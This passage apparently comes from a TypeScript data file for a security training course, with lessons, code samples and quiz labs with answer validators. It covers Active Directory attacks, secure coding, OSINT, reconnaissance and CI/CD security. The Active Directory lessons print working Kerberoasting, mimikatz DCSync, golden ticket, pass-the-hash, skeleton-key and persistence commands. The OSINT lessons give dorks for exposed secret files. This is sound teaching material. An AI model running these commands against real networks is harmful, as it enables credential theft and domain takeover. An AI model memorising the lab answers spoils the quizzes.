            skills: ['API security', 'IDOR testing', 'Authorization flaws']
          }
        }
      ]
    },
    // ============ NEW: ACTIVE DIRECTORY SECURITY ============
    {
      id: 'active-directory',
      title: 'Active Directory Attacks',
      description: 'AD enumeration, Kerberos attacks, privilege escalation in Windows domains',
      icon: Server,
      color: 'text-blue-500',
      bgGradient: 'from-blue-500/20 to-indigo-500/20',
      completed: false,
      category: 'offensive',
      estimatedTime: '8 hours',
      prerequisites: ['network-attacks'],
      lessons: [
        {
          id: 'ad-1',
          title: 'AD Enumeration',
          completed: false,
          keyPoints: [
            'LDAP queries and BloodHound',
            'User and group enumeration',
            'Trust relationships',
            'ACL analysis'
          ],
          content: `ACTIVE DIRECTORY ENUMERATION

INITIAL FOOTHOLD:
Once on domain-joined machine, enumerate everything!

TOOLS:
• BloodHound (graph-based analysis)
• PowerView (PowerShell)
• ldapsearch (Linux)
• ADExplorer (GUI)

KEY INFORMATION:
1. Domain Controllers
2. Domain Admins
3. Service accounts
4. Trust relationships
5. Group policies
6. Interesting ACLs

POWERVIEW COMMANDS:
Get-DomainUser
Get-DomainGroup -MemberIdentity "Domain Admins"
Get-DomainComputer -Properties name,operatingsystem
Get-DomainTrust
Find-LocalAdminAccess
Get-DomainGPO

BLOODHOUND COLLECTION:
SharpHound.exe -c All
# Collects: Users, Groups, Sessions, ACLs, Trusts

KEY PATHS TO DOMAIN ADMIN:
• Kerberoasting
• Pass-the-Hash
• Token impersonation
• ACL abuse
• GPO abuse`,
          codeExample: `# PowerView Enumeration Commands
Import-Module PowerView.ps1

# Get all users
Get-DomainUser | Select samaccountname, description

# Find users with SPNs (Kerberoastable)
Get-DomainUser -SPN

# Get Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"

# Find where current user has admin access
Find-LocalAdminAccess

# Get computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# ACL Analysis - who can DCSync?
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | 
    ? { $_.ObjectAceType -match "replication" }

# ldapsearch from Linux
ldapsearch -x -H ldap://dc.corp.local -D "user@corp.local" -W \\
    -b "DC=corp,DC=local" "(objectClass=user)" samaccountname description

# BloodHound data collection
./SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\\temp\\
# Upload resulting JSON to BloodHound

# Cypher Queries in BloodHound
# Shortest path to Domain Admin
MATCH p=shortestPath((n)-[*1..]->(m:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

# Find Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u`,
          liveLab: {
            id: 'lab-ad-enum',
            title: 'AD Attack Path',
            description: 'Identify privilege escalation path',
            difficulty: 'advanced',
            challenge: 'BloodHound shows: User "svc_backup" has GenericAll on "Domain Admins" group. What attack can you perform?',
            hint: 'GenericAll means full control over the object...',
            solution: 'Add yourself to Domain Admins group using the GenericAll permission',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('add') || lower.includes('modify') || lower.includes('change')) &&
                     (lower.includes('domain admin') || lower.includes('group') || lower.includes('member'));
            },
            completed: false,
            points: 100,
            timeEstimate: '20 min',
            skills: ['Active Directory', 'BloodHound', 'Privilege escalation']
          }
        },
        {
          id: 'ad-2',
          title: 'Kerberos Attacks',
          completed: false,
          keyPoints: [
            'Kerberoasting technique',
            'AS-REP Roasting',
            'Golden/Silver tickets',
            'Pass-the-Ticket attacks'
          ],
          content: `KERBEROS ATTACK TECHNIQUES

KERBEROS BASICS:
1. User requests TGT from KDC (AS-REQ)
2. KDC returns TGT encrypted with krbtgt hash (AS-REP)
3. User requests service ticket (TGS-REQ)
4. KDC returns ST encrypted with service hash (TGS-REP)
5. User presents ST to service

KERBEROASTING:
• Request service tickets for accounts with SPNs
• Tickets encrypted with service account password
• Crack offline!

Requirements: Any domain user
Target: Service accounts with SPNs

AS-REP ROASTING:
• Target accounts with "Do not require pre-auth"
• Request AS-REP without password
• Crack the response

GOLDEN TICKET:
• Forged TGT using krbtgt hash
• Grants access to ANY service
• Survives password resets!

Requirements: krbtgt hash (Domain Admin needed first)

SILVER TICKET:
• Forged service ticket
• Only grants access to specific service
• Doesn't touch DC

Requirements: Service account hash`,
          codeExample: `# Kerberoasting with Rubeus
.\\Rubeus.exe kerberoast /outfile:hashes.txt

# With Impacket
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.10 -request

# Crack the hash
hashcat -m 13100 hashes.txt wordlist.txt

# AS-REP Roasting
# Find vulnerable users
Get-DomainUser -PreauthNotRequired

# Request AS-REP
.\\Rubeus.exe asreproast /outfile:asrep.txt

# With Impacket
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 192.168.1.10

# Golden Ticket (requires krbtgt hash)
# Get krbtgt hash first via DCSync
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Create golden ticket
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \\
    /sid:S-1-5-21-... /krbtgt:NTLM_HASH /ptt

# Silver Ticket (for a service)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \\
    /sid:S-1-5-21-... /target:sql.corp.local /service:MSSQLSvc \\
    /rc4:SERVICE_HASH /ptt

# Pass-the-Ticket
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt ticket.kirbi`,
          liveLab: {
            id: 'lab-kerberoast',
            title: 'Kerberoasting Analysis',
            description: 'Understand Kerberos attack requirements',
            difficulty: 'advanced',
            challenge: 'You have a low-privileged domain user account. Which Kerberos attack can you perform with just these credentials, and what do you target?',
            hint: 'One attack only needs ANY valid domain credentials to request something...',
            solution: 'Kerberoasting - target service accounts with SPNs to get crackable tickets',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('kerberoast') && (lower.includes('spn') || lower.includes('service'));
            },
            completed: false,
            points: 100,
            timeEstimate: '25 min',
            skills: ['Kerberos', 'Active Directory', 'Credential attacks']
          }
        },
        {
          id: 'ad-3',
          title: 'Lateral Movement & Persistence',
          completed: false,
          keyPoints: [
            'Pass-the-Hash attacks',
            'Overpass-the-Hash',
            'DCSync attack',
            'Skeleton Key persistence'
          ],
          content: `LATERAL MOVEMENT IN AD

PASS-THE-HASH:
Use NTLM hash instead of password
• Works with local admin hash
• No need to crack!

OVERPASS-THE-HASH:
Convert NTLM hash to Kerberos ticket
• Stealthier than PtH
• Blends with normal auth

PASS-THE-TICKET:
Steal and reuse existing Kerberos tickets
• From memory with mimikatz
• Golden/Silver ticket injection

DCSYNC ATTACK:
Simulate Domain Controller replication
• Get ANY user's hash
• Including krbtgt!

Requirements: Replication rights (Domain Admin)

PERSISTENCE TECHNIQUES:

1. SKELETON KEY
   • Master password for any account
   • Requires DC access

2. GOLDEN TICKET
   • Forge tickets forever
   • Survives password changes

3. ACL ABUSE
   • Add hidden permissions
   • Harder to detect

4. SHADOW ADMIN
   • Add to privileged groups
   • Nested group membership`,
          codeExample: `# Pass-the-Hash with Mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local \\
    /ntlm:HASH /run:cmd.exe

# Or with Impacket
psexec.py -hashes :NTLM_HASH Administrator@192.168.1.10

# Overpass-the-Hash (get Kerberos ticket from hash)
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local \\
    /ntlm:HASH /run:"powershell -ep bypass"

# Then request ticket
klist  # Shows TGT obtained

# DCSync Attack (need Replication rights)
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# With Impacket
secretsdump.py corp.local/admin:password@dc.corp.local -just-dc

# Skeleton Key (inject backdoor password)
mimikatz # misc::skeleton
# Now "mimikatz" works as password for any user!

# Shadow Admin - Hidden group membership
Add-DomainGroupMember -Identity "Backup Operators" -Members hacker
# Many forget to audit Backup Operators, Server Operators, etc.

# DCSync persistence - add replication rights
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \\
    -PrincipalIdentity hacker \\
    -Rights DCSync`,
          liveLab: {
            id: 'lab-dcsync',
            title: 'DCSync Requirements',
            description: 'Understand DCSync attack',
            difficulty: 'expert',
            challenge: 'You want to perform DCSync to dump all domain hashes. What specific Active Directory permissions (rights) are required?',
            hint: 'DCSync simulates domain controller replication...',
            solution: 'Replicating Directory Changes + Replicating Directory Changes All (DS-Replication-Get-Changes)',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('replicat') && (lower.includes('change') || lower.includes('sync') || lower.includes('directory'));
            },
            completed: false,
            points: 125,
            timeEstimate: '25 min',
            skills: ['DCSync', 'Active Directory', 'Persistence']
          }
        }
      ]
    },
    // ============ NEW: SECURE CODING ============
    {
      id: 'secure-coding',
      title: 'Secure Coding Practices',
      description: 'Write secure code, prevent common vulnerabilities, code review techniques',
      icon: FileCode,
      color: 'text-lime-500',
      bgGradient: 'from-lime-500/20 to-green-500/20',
      completed: false,
      category: 'fundamentals',
      estimatedTime: '6 hours',
      lessons: [
        {
          id: 'secure-1',
          title: 'Input Validation & Sanitization',
          completed: false,
          keyPoints: [
            'Whitelist vs blacklist validation',
            'Context-aware output encoding',
            'Parameter binding',
            'File upload security'
          ],
          content: `INPUT VALIDATION BEST PRACTICES

VALIDATION PRINCIPLES:
1. Validate on SERVER side (never trust client)
2. Use WHITELIST approach (allow known good)
3. Validate type, length, format, range
4. Encode output based on context

WHITELIST VS BLACKLIST:
✓ Whitelist: Only allow [a-zA-Z0-9]
✗ Blacklist: Block <script> (bypassed easily)

CONTEXT-AWARE ENCODING:
• HTML context: &lt; for <
• JavaScript: \\x3c for <
• URL: %3C for <
• SQL: Parameterized queries

COMMON MISTAKES:
• Client-side only validation
• Trusting hidden form fields
• Incorrect encoding context
• Missing null byte checks

FILE UPLOAD SECURITY:
1. Validate file extension (whitelist)
2. Check magic bytes (file type)
3. Rename uploaded files
4. Store outside web root
5. Scan for malware
6. Set proper Content-Type on serve`,
          codeExample: `// TypeScript: Input Validation Examples

// Email validation
function validateEmail(email: string): boolean {
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/;
  return emailRegex.test(email) && email.length <= 254;
}

// Sanitize HTML output (prevent XSS)
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Parameterized query (prevent SQL injection)
import { createClient } from '@supabase/supabase-js';

async function getUser(userId: string) {
  const { data, error } = await supabase
    .from('users')
    .select('*')
    .eq('id', userId)  // ✓ Parameterized
    .single();
  return data;
}

// ❌ NEVER DO THIS
// const query = \`SELECT * FROM users WHERE id = '\${userId}'\`;

// File upload validation
function validateFileUpload(file: File): { valid: boolean; error?: string } {
  const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif'];
  const MAX_SIZE = 5 * 1024 * 1024; // 5MB
  
  if (!ALLOWED_TYPES.includes(file.type)) {
    return { valid: false, error: 'Invalid file type' };
  }
  
  if (file.size > MAX_SIZE) {
    return { valid: false, error: 'File too large' };
  }
  
  // Check magic bytes
  const magicBytes: Record<string, number[]> = {
    'image/jpeg': [0xFF, 0xD8, 0xFF],
    'image/png': [0x89, 0x50, 0x4E, 0x47],
    'image/gif': [0x47, 0x49, 0x46]
  };
  
  return { valid: true };
}`,
          liveLab: {
            id: 'lab-input-validation',
            title: 'Fix the Validation',
            description: 'Identify and fix input validation flaws',
            difficulty: 'intermediate',
            challenge: 'Code: if (!username.includes("<script>")) { saveToDb(username); }. Why is this insecure and what\'s the fix?',
            hint: 'This is a blacklist approach, and <script> isnt the only way to inject...',
            solution: 'Blacklist bypass - use whitelist regex like /^[a-zA-Z0-9_]+$/ or encode output',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('whitelist') || lower.includes('encode') || lower.includes('regex')) &&
                     (lower.includes('bypass') || lower.includes('blacklist') || lower.includes('other'));
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['Secure coding', 'Input validation', 'XSS prevention']
          }
        },
        {
          id: 'secure-2',
          title: 'Authentication Security',
          completed: false,
          keyPoints: [
            'Password storage best practices',
            'Multi-factor authentication',
            'Session management',
            'OAuth implementation pitfalls'
          ],
          content: `AUTHENTICATION SECURITY

PASSWORD STORAGE:
NEVER store plaintext passwords!

HASHING ALGORITHMS:
✓ Argon2id (winner of PHC)
✓ bcrypt (cost factor 12+)
✓ scrypt
✗ SHA-256 alone (too fast)
✗ MD5 (broken)

PASSWORD POLICY:
• Minimum 12 characters
• Check against breached lists (HaveIBeenPwned)
• No composition rules (they hurt security)
• Enable passphrase support

SESSION SECURITY:
• Regenerate ID after login
• HttpOnly + Secure cookie flags
• Short expiration for sensitive apps
• Bind to client (IP, user-agent)

MFA IMPLEMENTATION:
• TOTP (Google Authenticator)
• WebAuthn/FIDO2 (hardware keys)
• SMS as backup only
• Recovery codes (hashed!)

COMMON MISTAKES:
• Timing attacks in comparison
• Verbose error messages
• Missing brute-force protection
• Insecure password reset`,
          codeExample: `// Secure Password Handling

// Password hashing with bcrypt
import bcrypt from 'bcrypt';

const SALT_ROUNDS = 12;

async function hashPassword(password: string): Promise<string> {
  // Validate password strength first
  if (password.length < 12) {
    throw new Error('Password must be at least 12 characters');
  }
  
  return bcrypt.hash(password, SALT_ROUNDS);
}

async function verifyPassword(password: string, hash: string): Promise<boolean> {
  // bcrypt.compare is timing-safe
  return bcrypt.compare(password, hash);
}

// Secure session management
interface Session {
  id: string;
  userId: string;
  createdAt: Date;
  expiresAt: Date;
  ipAddress: string;
  userAgent: string;
}

function createSession(userId: string, req: Request): Session {
  const now = new Date();
  const expires = new Date(now.getTime() + 30 * 60 * 1000); // 30 min
  
  return {
    id: crypto.randomUUID(),
    userId,
    createdAt: now,
    expiresAt: expires,
    ipAddress: req.headers.get('x-forwarded-for') || 'unknown',
    userAgent: req.headers.get('user-agent') || 'unknown'
  };
}

// Rate limiting for login
const loginAttempts = new Map<string, { count: number; lockedUntil?: Date }>();

function checkRateLimit(identifier: string): boolean {
  const record = loginAttempts.get(identifier);
  
  if (record?.lockedUntil && record.lockedUntil > new Date()) {
    return false; // Still locked
  }
  
  return true;
}

function recordFailedAttempt(identifier: string) {
  const record = loginAttempts.get(identifier) || { count: 0 };
  record.count++;
  
  if (record.count >= 5) {
    // Lock for 15 minutes after 5 failures
    record.lockedUntil = new Date(Date.now() + 15 * 60 * 1000);
  }
  
  loginAttempts.set(identifier, record);
}`,
          liveLab: {
            id: 'lab-auth-security',
            title: 'Authentication Flaw',
            description: 'Identify authentication vulnerabilities',
            difficulty: 'intermediate',
            challenge: 'Login response shows: "Invalid password for user admin@corp.com". What information disclosure issue exists and how would you fix it?',
            hint: 'The error message confirms whether the username exists...',
            solution: 'Username enumeration - use generic message like "Invalid credentials" for both invalid user and password',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('enumerat') || lower.includes('confirm') || lower.includes('exist')) &&
                     (lower.includes('generic') || lower.includes('same') || lower.includes('invalid credential'));
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['Authentication', 'Information disclosure', 'Secure coding']
          }
        },
        {
          id: 'secure-3',
          title: 'Secrets Management',
          completed: false,
          keyPoints: [
            'Environment variables vs vaults',
            'API key rotation',
            'Secrets in CI/CD',
            'Detecting leaked secrets'
          ],
          content: `SECRETS MANAGEMENT

WHAT ARE SECRETS?
• API keys
• Database credentials
• Encryption keys
• OAuth tokens
• Private certificates

NEVER DO:
✗ Hardcode in source code
✗ Commit to git
✗ Log secrets
✗ Share via email/Slack
✗ Store in plaintext files

BEST PRACTICES:

1. ENVIRONMENT VARIABLES
   • 12-factor app methodology
   • Different per environment
   • Not in version control

2. SECRETS MANAGERS
   • HashiCorp Vault
   • AWS Secrets Manager
   • Azure Key Vault
   • Google Secret Manager

3. ROTATION
   • Automate key rotation
   • Short-lived tokens
   • Invalidate on suspected leak

4. CI/CD SECRETS
   • Use platform's secret storage
   • Never echo secrets
   • Mask in logs

DETECTION:
• git-secrets (pre-commit)
• truffleHog (history scan)
• GitHub secret scanning
• Gitleaks`,
          codeExample: `// Secrets Management Examples

// ❌ NEVER DO THIS
const API_KEY = "sk_live_abc123..."; // Hardcoded

// ✓ Use environment variables
const API_KEY = process.env.API_KEY;
if (!API_KEY) {
  throw new Error('API_KEY environment variable required');
}

// TypeScript: Validate required env vars at startup
interface EnvConfig {
  DATABASE_URL: string;
  API_KEY: string;
  JWT_SECRET: string;
}

function loadConfig(): EnvConfig {
  const required = ['DATABASE_URL', 'API_KEY', 'JWT_SECRET'];
  const missing = required.filter(key => !process.env[key]);
  
  if (missing.length > 0) {
    throw new Error(\`Missing env vars: \${missing.join(', ')}\`);
  }
  
  return {
    DATABASE_URL: process.env.DATABASE_URL!,
    API_KEY: process.env.API_KEY!,
    JWT_SECRET: process.env.JWT_SECRET!
  };
}

// Pre-commit hook to prevent secret commits
// .pre-commit-config.yaml
/*
repos:
  - repo: https://github.com/awslabs/git-secrets
    hooks:
      - id: git-secrets
*/

// Gitleaks configuration (.gitleaks.toml)
/*
[rules]
  description = "AWS Access Key"
  regex = '''AKIA[0-9A-Z]{16}'''
  
  description = "Generic API Key"
  regex = '''(?i)api[_-]?key.*['\"][a-zA-Z0-9]{20,}['\"]'''
*/

// Runtime secret masking in logs
function maskSecrets(message: string, secrets: string[]): string {
  let masked = message;
  for (const secret of secrets) {
    masked = masked.replace(new RegExp(secret, 'g'), '***REDACTED***');
  }
  return masked;
}`,
          liveLab: {
            id: 'lab-secrets',
            title: 'Find the Secret Leak',
            description: 'Identify secret exposure',
            difficulty: 'beginner',
            challenge: 'console.log("Connecting with API key: " + apiKey). Even if apiKey is from env vars, what\'s wrong with this code?',
            hint: 'Think about where console.log output ends up...',
            solution: 'Secret is logged - will appear in log files, monitoring systems, and could be exposed. Never log secrets.',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('log') || lower.includes('print') || lower.includes('output')) &&
                     (lower.includes('expos') || lower.includes('leak') || lower.includes('never'));
            },
            completed: false,
            points: 50,
            timeEstimate: '10 min',
            skills: ['Secrets management', 'Logging security', 'Secure coding']
          }
        }
      ]
    },
    // ============ NEW: OSINT & RECONNAISSANCE ============
    {
      id: 'osint',
      title: 'OSINT & Reconnaissance',
      description: 'Open source intelligence gathering, passive and active reconnaissance',
      icon: Search,
      color: 'text-amber-500',
      bgGradient: 'from-amber-500/20 to-orange-500/20',
      completed: false,
      category: 'offensive',
      estimatedTime: '5 hours',
      lessons: [
        {
          id: 'osint-1',
          title: 'Passive Reconnaissance',
          completed: false,
          keyPoints: [
            'Search engine dorking',
            'DNS and WHOIS enumeration',
            'Social media intelligence',
            'Document metadata extraction'
          ],
          content: `PASSIVE RECONNAISSANCE

Gather information WITHOUT touching target directly!

SEARCH ENGINE DORKING:
Google operators:
• site:target.com
• filetype:pdf site:target.com
• inurl:admin site:target.com
• intitle:"index of" site:target.com
• "password" filetype:txt site:target.com

DNS ENUMERATION:
• Subdomain discovery
• MX, TXT, NS records
• Zone transfers (if misconfigured)
• Historical DNS (SecurityTrails)

WHOIS INFORMATION:
• Registrant contact
• Name servers
• Registration dates
• Historical data

SOCIAL MEDIA:
• Employee profiles (LinkedIn)
• Technology stack (job postings)
• Company structure
• Email formats

DOCUMENT METADATA:
• Author names
• Software versions
• Internal paths
• Email addresses

TOOLS:
• theHarvester
• Maltego
• Shodan
• Censys
• SpiderFoot`,
          codeExample: `# Passive Recon Commands

# theHarvester - gather emails, subdomains
theHarvester -d target.com -b all -l 500

# DNS enumeration
dig ANY target.com
dig +short MX target.com
dig +short TXT target.com

# Subdomain brute force (passive sources)
amass enum -passive -d target.com

# WHOIS lookup
whois target.com

# Certificate transparency logs
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value'

# Shodan search
shodan search "hostname:target.com"
shodan host 192.168.1.1

# Google dork automation
# ghdb.py - Google Hacking Database
inurl:wp-admin site:target.com
filetype:sql site:target.com
filetype:env site:target.com

# Extract metadata from documents
exiftool document.pdf
# Look for: Author, Creator, Producer, GPS

# Python: Automated OSINT
import requests
from bs4 import BeautifulSoup

def harvest_emails(domain):
    """Find emails from search results"""
    emails = set()
    
    # Search via DuckDuckGo (no API needed)
    query = f"site:{domain} email"
    url = f"https://html.duckduckgo.com/html/?q={query}"
    
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Extract email patterns
    import re
    email_pattern = r'[a-zA-Z0-9._%+-]+@' + re.escape(domain)
    
    for text in soup.stripped_strings:
        found = re.findall(email_pattern, text)
        emails.update(found)
    
    return list(emails)`,
          liveLab: {
            id: 'lab-osint',
            title: 'OSINT Challenge',
            description: 'Construct effective search queries',
            difficulty: 'beginner',
            challenge: 'Write a Google dork to find exposed .env files on GitHub for any repository.',
            hint: 'Think about filename and the site...',
            solution: 'site:github.com filename:.env or site:github.com ".env" password',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('site:github') && (lower.includes('.env') || lower.includes('filename'));
            },
            completed: false,
            points: 50,
            timeEstimate: '10 min',
            skills: ['OSINT', 'Google dorking', 'Reconnaissance']
          }
        },
        {
          id: 'osint-2',
          title: 'Active Reconnaissance',
          completed: false,
          keyPoints: [
            'Port scanning techniques',
            'Service enumeration',
            'Web technology fingerprinting',
            'Vulnerability scanning'
          ],
          content: `ACTIVE RECONNAISSANCE

Direct interaction with target - may be detected!

PORT SCANNING:
• TCP Connect scan (reliable, loud)
• SYN scan (stealthy, requires root)
• UDP scan (slow, important)
• Version detection

SERVICE ENUMERATION:
For each open port:
• Banner grabbing
• Version detection
• Default credentials check
• Known vulnerabilities

WEB FINGERPRINTING:
• Server headers
• Cookies (session frameworks)
• Error pages
• robots.txt, sitemap.xml
• JavaScript libraries

VULNERABILITY SCANNING:
• Nessus, OpenVAS
• Nikto (web)
• Nuclei (templates)

STEALTH CONSIDERATIONS:
• Slow scan rate
• Fragment packets
• Decoy IPs
• Tor/proxies
• Timing (after hours)`,
          codeExample: `# Nmap Scanning Techniques

# Quick scan - top 1000 ports
nmap -sV -sC target.com

# Full port scan
nmap -p- --min-rate 1000 target.com

# Stealth SYN scan
nmap -sS -T2 target.com

# UDP scan (important services)
nmap -sU --top-ports 100 target.com

# Service version + scripts
nmap -sV -sC -p 22,80,443 target.com

# Vulnerability scan
nmap --script vuln target.com

# OS detection
nmap -O target.com

# Output to all formats
nmap -sV -sC -oA scan_results target.com

# Web fingerprinting
whatweb https://target.com
wappalyzer https://target.com

# Nikto web scan
nikto -h https://target.com

# Nuclei vulnerability scan
nuclei -u https://target.com -t cves/

# Directory brute force
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Python: Port Scanner
import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()
        
        if result == 0:
            return port, 'open'
    except:
        pass
    return port, 'closed'

def port_scan(host, ports):
    open_ports = []
    with ThreadPoolExecutor(max_workers=100) as executor:
        results = executor.map(lambda p: scan_port(host, p), ports)
        for port, status in results:
            if status == 'open':
                open_ports.append(port)
    return open_ports`,
          liveLab: {
            id: 'lab-active-recon',
            title: 'Nmap Scan Analysis',
            description: 'Interpret port scan results',
            difficulty: 'intermediate',
            challenge: 'Nmap shows port 3389 open with service "ms-wbt-server". What service is this and what attack would you try first?',
            hint: 'This is a Windows remote access service...',
            solution: 'RDP (Remote Desktop Protocol) - try credential brute force or check for BlueKeep (CVE-2019-0708)',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('rdp') || lower.includes('remote desktop')) &&
                     (lower.includes('brute') || lower.includes('bluekeep') || lower.includes('credential'));
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['Port scanning', 'Service enumeration', 'Nmap']
          }
        }
      ]
    },
    // ============ NEW: SECURITY AUTOMATION ============
    {
      id: 'security-automation',
      title: 'Security Automation & DevSecOps',
      description: 'Automate security testing, CI/CD security, infrastructure as code',
      icon: Wrench,
      color: 'text-violet-500',
      bgGradient: 'from-violet-500/20 to-purple-500/20',
      completed: false,
      category: 'advanced',
      estimatedTime: '6 hours',
      lessons: [
        {
          id: 'automation-1',
          title: 'CI/CD Pipeline Security',
          completed: false,
          keyPoints: [
            'SAST integration',
            'DAST in pipelines',
            'Dependency scanning',
            'Container image scanning'
          ],
          content: `CI/CD SECURITY (DevSecOps)

SHIFT LEFT SECURITY:
Find vulnerabilities early in development!

PIPELINE SECURITY STAGES:

1. PRE-COMMIT
   • Secret scanning (git-secrets)
   • Linting
   • IDE security plugins

2. BUILD
   • SAST (Static Analysis)
   • Dependency check
   • License compliance

3. TEST
   • DAST (Dynamic Analysis)
   • API security testing
   • Fuzz testing

4. DEPLOY
   • Container scanning
   • IaC security
   • Compliance checks

5. RUNTIME
   • RASP
   • Monitoring
   • Vulnerability management

TOOLS BY CATEGORY:
SAST: Semgrep, SonarQube, CodeQL
DAST: OWASP ZAP, Burp Suite
SCA: Snyk, Dependabot, OWASP Dependency-Check
Container: Trivy, Clair, Anchore
IaC: Checkov, tfsec, Terrascan`,
          codeExample: `# GitHub Actions Security Pipeline
name: Security Scan

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      # Secret scanning
      - name: Gitleaks
        uses: gitleaks/gitleaks-action@v2
      
      # SAST with Semgrep
      - name: Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: p/security-audit
      
      # Dependency scanning
      - name: Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 'my-project'
          path: '.'
          format: 'HTML'
      
      # Container scanning
      - name: Build image
        run: docker build -t myapp:latest .
        
      - name: Trivy scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:latest'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'
      
      # DAST with ZAP
      - name: OWASP ZAP Scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'https://staging.example.com'

# Semgrep custom rule
rules:
  - id: hardcoded-secret
    patterns:
      - pattern-either:
        - pattern: $X = "..."
        - pattern: $X = '...'
      - metavariable-regex:
          metavariable: $X
          regex: (api_key|password|secret|token)
    message: "Potential hardcoded secret"
    severity: ERROR`,
          liveLab: {
            id: 'lab-cicd-security',
            title: 'Pipeline Security Design',
            description: 'Design secure CI/CD pipeline',
            difficulty: 'intermediate',
            challenge: 'A developer pushes code with a hardcoded AWS key. At which CI/CD stage should this be caught EARLIEST, and which tool type would detect it?',
            hint: 'Think about the earliest stage before code even enters the repo...',
            solution: 'Pre-commit stage with secret scanning tool (git-secrets, gitleaks)',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('pre-commit') || lower.includes('pre commit') || lower.includes('before commit')) &&
                     (lower.includes('secret') || lower.includes('gitleaks') || lower.includes('git-secrets'));
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['DevSecOps', 'CI/CD security', 'Secret scanning']
          }
        },
        {
          id: 'automation-2',
          title: 'Infrastructure as Code Security',
          completed: false,
          keyPoints: [
            'Terraform security scanning',
            'CloudFormation security',
            'Policy as Code (OPA)',
            'Drift detection'
          ],
          content: `INFRASTRUCTURE AS CODE SECURITY

WHY IaC SECURITY?
• Misconfiguration = #1 cloud breach cause
• Scan before deployment
• Enforce security policies
• Audit trail

COMMON MISCONFIGURATIONS:

AWS:
• S3 buckets public
• Security groups 0.0.0.0/0
• Unencrypted databases
• Missing CloudTrail

Azure:
• Storage accounts public
• NSG allowing SSH from any
• Missing diagnostic logs

GCP:
• Firewall rules too permissive
• Public BigQuery datasets
• Missing audit logging

TOOLS:
• Checkov (multi-cloud)
• tfsec (Terraform)
• cfn-lint + cfn_nag (CloudFormation)
• Terrascan
• Bridgecrew

POLICY AS CODE:
• OPA/Rego for custom policies
• Sentinel (Terraform Enterprise)
• Kyverno (Kubernetes)`,
          codeExample: `# tfsec scan for Terraform
tfsec .

# Checkov multi-framework scan
checkov -d . --framework terraform,cloudformation

# Example Terraform with security issues
resource "aws_s3_bucket" "bad_bucket" {
  bucket = "my-bucket"
  # ❌ No encryption
  # ❌ No versioning
  # ❌ No access logging
}

# ✓ Secure S3 bucket
resource "aws_s3_bucket" "secure_bucket" {
  bucket = "my-secure-bucket"
}

resource "aws_s3_bucket_server_side_encryption_configuration" "encryption" {
  bucket = aws_s3_bucket.secure_bucket.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
    }
  }
}

resource "aws_s3_bucket_versioning" "versioning" {
  bucket = aws_s3_bucket.secure_bucket.id
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_public_access_block" "block_public" {
  bucket = aws_s3_bucket.secure_bucket.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# OPA/Rego Policy
package terraform.s3

deny[msg] {
  resource := input.resource.aws_s3_bucket[name]
  not resource.server_side_encryption_configuration
  msg := sprintf("S3 bucket '%s' missing encryption", [name])
}

deny[msg] {
  resource := input.resource.aws_security_group[name]
  ingress := resource.ingress[_]
  ingress.cidr_blocks[_] == "0.0.0.0/0"
  ingress.from_port <= 22
  ingress.to_port >= 22
  msg := sprintf("Security group '%s' allows SSH from any IP", [name])
}`,
          liveLab: {
            id: 'lab-iac-security',
            title: 'IaC Vulnerability',
            description: 'Find infrastructure misconfigurations',
            difficulty: 'intermediate',
